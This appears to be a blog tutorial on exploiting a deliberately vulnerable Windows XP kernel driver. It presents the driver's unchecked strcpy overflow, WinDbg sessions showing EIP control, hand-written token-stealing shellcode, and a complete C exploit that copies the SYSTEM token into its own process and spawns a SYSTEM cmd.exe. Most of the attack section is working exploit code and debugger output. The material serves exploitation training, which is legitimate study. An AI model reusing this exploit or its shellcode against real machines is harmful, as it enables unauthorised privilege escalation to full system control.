---
layout: post
title:  "Kernel buffer overflow on Windows"
---

The buffer overflow are cool in user-land but they can be more funny in 
kernel-land. This time, we will use a buffer overflow to make an escalade 
privilege to get the SYSTEM rights, so we will could make anything we want on 
the system. To train us, we don't need to code a driver by ourself: 0vercl0k 
have done it for us! So we got the level 1 files and we start our XP VM.

```c
#include <Ntifs.h>

#define ERROR(_f_, _status_) DbgPrint("\r\n[!] Error at %s() : 0x%x\r\n", _f_, _status_)
#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DbgPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0x1337, __VA_ARGS__)

typedef unsigned int DWORD;
typedef unsigned char* PBYTE;
typedef unsigned char BYTE;

//
DRIVER_UNLOAD Unload;
DRIVER_INITIALIZE DriverEntry;
DRIVER_DISPATCH handleIOCTLs;
DRIVER_DISPATCH handleIRP;
//

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj , PUNICODE_STRING pRegistryPath)
{
    DWORD i = 0;
    NTSTATUS status;
    UNICODE_STRING deviceName = {0}, symlinkName = {0};
    PDEVICE_OBJECT pDevice = NULL;

    pDriverObj->DriverUnload = Unload;
    DbgPrint("[ Loading.. ]\r\n");

    RtlInitUnicodeString(&deviceName, L"\\Device\\1");
    RtlInitUnicodeString(&symlinkName, L"\\DosDevices\\1");

    DbgPrint("[ Creating the device...]\n");
    IoCreateDevice(
        pDriverObj,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &pDevice
    );

    DbgPrint("[ Linking...]\n");
    IoCreateSymbolicLink(&symlinkName, &deviceName);

    for(; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        pDriverObj->MajorFunction[i] = handleIRP;

    pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = handleIOCTLs;
    return STATUS_SUCCESS;
}

NTSTATUS handleIRP(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    return STATUS_SUCCESS;
}

NTSTATUS handleIOCTLs(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
    PIO_STACK_LOCATION pIoStackLocation = NULL;
    ULONG ioControlCode = 0, inputBufferLength = 0, inputBuffer = 0;
    BYTE buffer[256] = {0};

    pIoStackLocation = IoGetCurrentIrpStackLocation(pIrp);
    ioControlCode = pIoStackLocation->Parameters.DeviceIoControl.IoControlCode;
    inputBufferLength = pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
    inputBuffer = (ULONG)pIrp->AssociatedIrp.SystemBuffer;

    switch(ioControlCode)
    {
        case IOCTL_HI:
        {
            DbgPrint("[ Let's copying this buffer...]");

            /* ! w00tz ! */
            strcpy(buffer, inputBuffer);
            break;
        }
    }

    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return pIrp->IoStatus.Status;
}

VOID Unload(PDRIVER_OBJECT pDrivObj)
{
    DbgPrint("[ Unloading.. ]\n");
    return;
}
```

It's easy to see the problem: the copy size in `strcpy` is not checked!


## Tools

To test the driver, we will need the Windows Driver Kit, WinDbg and an assembly 
code compiler, FASM. To compile with the WDK, we need to make a file with the 
name `makefile`:

```
!INCLUDE $(NTMAKEENV)\makefile.def
```

Fo a driver, the file `sources` has this content:

```
TARGETNAME = level1
TARGETPATH = obj
TARGETTYPE = DRIVER

INCLUDES = %BUILD%\inc
LIBS = %BUILD%\lib

SOURCES = level1.c
```

And the `sources` file for a simple .exe:

```
TARGETNAME=exploit
TARGETTYPE=PROGRAM

INCLUDES=

SOURCES=exploit.c

UMTYPE=console
UMBASE=0x04000000

USE_MSVCRT=1
```


## Debug a VM

In Windows VM, `msconfig.exe -> BOOT.ini -> Advanced -> /DEBUG /DEBUGPORT=COM1:`
and reboot. In VirtualBox, `Machine -> Settings -> Serial Ports` and configure it.
In WinDbg, `File -> Kernel Debug... -> COM` and click on OK.


## Exploitation

Now, we can load our driver with Driver Loader and test our entry:

```c
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>

#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DEVICE_NAME "\\\\.\\1"

int main()
{
    DWORD byte = 0, lenMagik = 0, addr = 0;
    HANDLE hDevice = NULL;
    UCHAR magik[1024] = {0};

    memset(magik, 0x90, 276); // Padding
    lenMagik += 276;
    memcpy(magik+276, "\x42\x42\x42\x42\x00", 5); // Shellcode address?
    lenMagik += 5;

    hDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Error with Createfile : %.8x.\n", GetLastError());
        return EXIT_FAILURE;
    }

    DeviceIoControl(hDevice, IOCTL_HI, magik, lenMagik, NULL, 0, &byte, NULL);
    CloseHandle(hDevice);

    return EXIT_SUCCESS;
}
```

```
C:\WinDDK\7600.16385.1>cd C:\driver\level0

C:\driver\level0>build
BUILD: Compile and Link for x86
BUILD: Loading c:\winddk\7600.16385.1\build.dat...
BUILD: Computing Include file dependencies:
BUILD: Start time: Thu Feb 27 09:13:48 2014
BUILD: Examining c:\driver\level0 directory for files to compile.
    c:\driver\level0 Invalidating OACR warning log for 'root:x86chk'
BUILD: Saving c:\winddk\7600.16385.1\build.dat...
BUILD: Compiling and Linking c:\driver\level0 directory
Configuring OACR for 'root:x86chk' - <OACR on>
_NT_TARGET_VERSION SET TO WINXP
Compiling - exploit.c
Linking Executable - objchk_wxp_x86\i386\exploit.exe
BUILD: Finish time: Thu Feb 27 09:13:58 2014
BUILD: Done

    3 files compiled - 1 Warning - 30 LPS
    1 executable built
```

```
kd> g
[ Loading.. ]
[ Creating the device...]
[ Linking...]

kd> lm
start    end        module name
804d7000 806cfe00   nt         (pdb symbols)          c:\windows\symbols\xp\exe\ntkrnlpa.pdb
baf7d000 baf7da80   1          (deferred)             

kd> ? $iment(0xbaf7d000)
Evaluate expression: -1158163440 = baf7d410

kd> uf baf7d410
...
1+0x4f7:
baf7d4f7 8b4508          mov     eax,dword ptr [ebp+8]
baf7d4fa c7407020d5f7ba  mov     dword ptr [eax+70h],offset 1+0x520 (baf7d520)
baf7d501 33c0            xor     eax,eax
baf7d503 8be5            mov     esp,ebp
baf7d505 5d              pop     ebp
baf7d506 c20800          ret     8

kd> uf baf7d520
...
1+0x61b:
baf7d61b 32d2            xor     dl,dl
baf7d61d 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]
baf7d620 ff150cd8f7ba    call    dword ptr [1+0x80c (baf7d80c)]
baf7d626 8b450c          mov     eax,dword ptr [ebp+0Ch]
baf7d629 8b4018          mov     eax,dword ptr [eax+18h]
baf7d62c 8be5            mov     esp,ebp
baf7d62e 5d              pop     ebp
baf7d62f c20800          ret     8

kd> bp baf7d62f
```

All is ready ! We `!go` and WinDbg look like that:

```
kd> g
[ Let's copying this buffer...]Breakpoint 0 hit
1+0x62f:
baf7d62f c20800          ret     8

kd> dd esp
b9019c38  42424242 8657fc00 863b0700 806d1070
b9019c48  80574d5e 863b0770 8672a420 863b0700

kd> t
42424242 ??              ???
```

We control EIP! Therefore, we will put a shellcode in userland to make an 
escalade privilege of our process. After that, we will point EIP to our 
shellcode and hop, our process have the SYSTEM rights!


## Shellcode

Now we need to code a shellcode to swap the SYSTEM token with our process token.
To do that, we look for useful structures in Windows kernel:

```
kd> r fs
fs=00000030

kd> dg fs
                                  P Si Gr Pr Lo
Sel    Base     Limit     Type    l ze an es ng Flags
---- -------- -------- ---------- - -- -- -- -- --------
0030 ffdff000 00001fff Data RW Ac 0 Bg Pg P  Nl 00000c93

kd> dt _KPCR ffdff000
nt!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x01c SelfPcr          : 0xffdff000 _KPCR
   +0x020 Prcb             : 0xffdff120 _KPRCB
   +0x024 Irql             : 0x1c ''
   +0x028 IRR              : 4
   +0x02c IrrActive        : 0
   +0x030 IDR              : 0xffff20d8
   +0x034 KdVersionBlock   : 0x80545ab8 Void
   +0x038 IDT              : 0x8003f400 _KIDTENTRY
   +0x03c GDT              : 0x8003f000 _KGDTENTRY
   +0x040 TSS              : 0x80042000 _KTSS
   +0x044 MajorVersion     : 1
   +0x046 MinorVersion     : 1
   +0x048 SetMember        : 1
   +0x04c StallScaleFactor : 0x64
   +0x050 DebugActive      : 0 ''
   +0x051 Number           : 0 ''
   +0x052 Spare0           : 0 ''
   +0x053 SecondLevelCacheAssociativity : 0 ''
   +0x054 VdmAlert         : 0
   +0x058 KernelReserved   : [14] 0
   +0x090 SecondLevelCacheSize : 0
   +0x094 HalReserved      : [16] 0
   +0x0d4 InterruptMode    : 0
   +0x0d8 Spare1           : 0 ''
   +0x0dc KernelReserved2  : [17] 0
   +0x120 PrcbData         : _KPRCB

kd> dt _KPRCB ffdff000+0x120 
nt!_KPRCB
   +0x000 MinorVersion     : 1
   +0x002 MajorVersion     : 1
   +0x004 CurrentThread    : 0x80552740 _KTHREAD

kd> dt _KTHREAD poi(ffdff000+0x120+0x004) 
nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x010 MutantListHead   : _LIST_ENTRY [ 0x80552750 - 0x80552750 ]
   +0x018 InitialStack     : 0x80549f00 Void
   +0x01c StackLimit       : 0x80546f00 Void
   +0x020 Teb              : (null) 
   +0x024 TlsArray         : (null) 
   +0x028 KernelStack      : 0x80549c4c Void
   +0x02c DebugActive      : 0 ''
   +0x02d State            : 0x2 ''
   +0x02e Alerted          : [2]  ""
   +0x030 Iopl             : 0 ''
   +0x031 NpxState         : 0xa ''
   +0x032 Saturation       : 0 ''
   +0x033 Priority         : 16 ''
   +0x034 ApcState         : _KAPC_STATE

kd> dt _KAPC_STATE poi(ffdff000+0x120+0x004)+0x034 
nt!_KAPC_STATE
   +0x000 ApcListHead      : [2] _LIST_ENTRY [ 0x80552774 - 0x80552774 ]
   +0x010 Process          : 0x805529a0 _KPROCESS

kd> dt _EPROCESS poi(ffdff000+0x120+0x004)+0x034+0x10 
nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x06c ProcessLock      : _EX_PUSH_LOCK
   +0x070 CreateTime       : _LARGE_INTEGER 0x80552838`00000000
   +0x078 ExitTime         : _LARGE_INTEGER 0x80552740`80552838
   +0x080 RundownProtect   : _EX_RUNDOWN_REF
   +0x084 UniqueProcessId  : (null) 
   +0x088 ActiveProcessLinks : _LIST_ENTRY [ 0x10102 - 0x0 ]
   +0x090 QuotaUsage       : [3] 0
   +0x09c QuotaPeak        : [3] 0x80552fa0
   +0x0a8 CommitCharge     : 0
   +0x0ac PeakVirtualSize  : 0xa0008
   +0x0b0 VirtualSize      : 0
   +0x0b4 SessionProcessLinks : _LIST_ENTRY [ 0x80552838 - 0x80552838 ]
   +0x0bc DebugPort        : (null) 
   +0x0c0 ExceptionPort    : (null) 
   +0x0c4 ObjectTable      : (null) 
   +0x0c8 Token            : _EX_FAST_REF
```

We could use `UniqueProcessId (+0x084)`, our `Token (+0x0c8)` and also the 
linked list `ActiveProcessLinks (+0x088)` to get the list of all process.
In XP, the identifier of SYSTEM process is *4* and we can get our PID with 
`GetCurrentProcessId()`. With these information, we can code our shellcode. 
I have coded mine with the FASM syntax:


```nasm
format PE GUI 4.0

start:

;--------------------------------
; 			Stack
;--------------------------------
; ESP-8: EPROCESS+0x088 system
;--------------------------------
; ESP-4: EPROCESS+0x088 exploit
;--------------------------------
push 0xFFFFFFFF
push 0xFFFFFFFF

mov edx, [fs:0x124]     ; +0x120 PrcbData : _KPRCB | +0x004 CurrentThread : _KTHREAD			
mov edx, [edx + 0x44]   ; +0x034 ApcState : _KAPC_STATE | +0x010 Process : _KPROCESS
add edx, 0x88           ; +0x088 ActiveProcessLinks : _LIST_ENTRY
mov ebx, edx            ; Our linked list \o/ We save the first structure

searchProcess:
mov eax, [edx - 0x4]    ; +0x084 UniqueProcessId
cmp eax, 0x4            ; SYSTEM PID
je sysProcFound
cmp eax, 0x41414141     ; Our exploit PID
je exploitProcFound

nextProcess:
mov edx, [edx]          ; Next process (Flink)
cmp edx, ebx            ; We are back at the starting point
je retApp				
jmp searchProcess       ; We loop!

sysProcFound:
mov [esp+4], edx
jmp allPIDFound

exploitProcFound:
mov [esp], edx

allPIDFound:
cmp [esp], dword 0xFFFFFFFF
je nextProcess
cmp [esp+4], dword 0xFFFFFFFF
je nextProcess

; We copy the SYSTEM token
pop edi                 ; Exploit
pop esi	                ; System
mov eax, [esi + 0x40]   ; 0xC8 - 0x88 = 0x40 | +0x0c8 Token : _EX_FAST_REF
mov [edi + 0x40], eax

retApp:
xor eax, eax
mov al, 0x3B            ; FS address in userland
mov fs, ax
mov ecx, 0x42424242     ; Stack address
mov edx, 0x43434343     ; Address of our function in our process
sysexit
```

## Final exploit

```c
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>

#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DEVICE_NAME "\\\\.\\1"

BYTE shellcode[] =  "\x6A\xFF\x6A\xFF\x64\x8B\x15\x24\x01\x00\x00\x8B\x52\x44\x81\xC2\x88\x00\x00\x00\x89\xD3\x8B"
                    "\x42\xFC\x83\xF8\x04\x74\x0F\x3D\x41\x41\x41\x41\x74\x0E\x8B\x12\x39\xDA\x74\x26\xEB\xE9\x89"
                    "\x54\x24\x04\xEB\x03\x89\x14\x24\x81\x3C\x24\xFF\xFF\xFF\xFF\x74\xE6\x81\x7C\x24\x04\xFF\xFF"
                    "\xFF\xFF\x74\xDC\x5F\x5E\x8B\x46\x40\x89\x47\x40\x31\xC0\xB0\x3B\x8E\xE0\xB9\x42\x42\x42\x42"
                    "\xBA\x43\x43\x43\x43\x0F\x35";
STARTUPINFO si = {0};
PROCESS_INFORMATION pi = {0};  


void replacePattern(char buffer[], int bufferSize, DWORD pattern, DWORD value) {
    BOOL found = FALSE;
    int i;

    for (i = 0; i < bufferSize; i++) {
        if (*(PDWORD)(buffer + i) == pattern) {
            found = TRUE;
            *(PDWORD)(buffer + i) = value;
        }
    }

    return found;
}

// Code to execute with SYSTEM's right
//
void sysCode() {
    si.cb = sizeof(si);

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
}

int findStack() {
    DWORD stack;

    __asm mov stack, esp

    return stack;
}

int main() {
    DWORD byte = 0, lenMagik = 0, addr = 0;
    HANDLE hDevice = NULL;
    UCHAR magik[1024] = {0};

    addr = VirtualAlloc(0x01010101, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(addr == 0) {
        printf("Error with VirtualProtect : %.8x", GetLastError());
        return EXIT_FAILURE;
    }

    replacePattern(shellcode, sizeof(shellcode), 0x41414141, GetCurrentProcessId());    // Process PID
    replacePattern(shellcode, sizeof(shellcode), 0x42424242, findStack());              // Stack address
    replacePattern(shellcode, sizeof(shellcode), 0x43434343, sysCode);                  // Code to execute with SYSTEM's right
    memcpy(0x01010101, shellcode, sizeof(shellcode));

    memset(magik, 0x90, 276);                       // Padding
    lenMagik += 276;
    memcpy(magik+276, "\x01\x01\x01\x01\x00", 5);   // Shellcode address
    lenMagik += 5;

    hDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Error with Createfile : %.8x.\n", GetLastError());
        return EXIT_FAILURE;
    }

    DeviceIoControl(hDevice, IOCTL_HI, magik, lenMagik, NULL, 0, &byte, NULL);
    CloseHandle(hDevice);

    return EXIT_SUCCESS;
}
```